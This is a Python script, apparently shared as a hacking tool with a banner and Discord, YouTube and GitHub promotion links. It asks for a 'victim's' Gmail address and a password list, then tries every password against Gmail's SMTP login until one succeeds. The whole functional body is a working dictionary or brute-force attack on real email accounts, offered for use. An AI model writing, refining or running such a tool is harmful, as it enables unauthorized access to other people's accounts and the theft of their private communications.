import smtplib
from six.moves import input
from colorama import Fore, Back, Style 
import time
import sys
import os
from tqdm import tqdm 

for i in tqdm (range (101),  
               desc=Fore.RED + "Loading. . .",  
               ascii=False, ncols=75): 
    time.sleep(0.01)       

#the Fore.GREEN adds colour to the loading bar
print(Fore.RED + "Complete. . .") 
time.sleep(1) 
#this will clear the terminal
os.system('cls' if os.name == 'nt' else 'clear')

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print(Fore.RED + '''                 !#########       #
               !########!          ##!
            !########!               ###
         !##########                  ####
       ######### #####                ######
        !###!      !####!              ######
          !           #####            ######!
                        !####!         #######
                           #####       #######
                             !####!   #######!
                                ####!########
             ##                   ##########
           ,######!          !#############
         ,#### ########################!####!
       ,####'     ##################!'    #####
     ,####'            #######              !####!
    ####'                                      #####
    ~##                                          ##~''')
print(''' _____________________________________________________________________
|                                                                     |
| DISCORD:https://discord.gg/cpjA8Exy                                 |
| YOUTUBE:https://www.youtube.com/channel/UCiqm6EzcaR8TdU2qwJ2lgAg    |
| GITHUB:https://github.com/RSA-TEMPZ                                 |   
|_____________________________________________________________________|   ''') 
user = input("VICTIMS GMAIL:")
passfile = input("Pass List:")

passfile = open(passfile, "r")

for password in passfile:
  try:
    smtpserver.login(user, password)
    print(Fore.GREEN + "[+] Password Found: %s" % password)
    time.sleep(10)
    break;
  except smtplib.SMTPAuthenticationError:
      print(Fore.RED + "[!] Password Incorrect: %s" % password)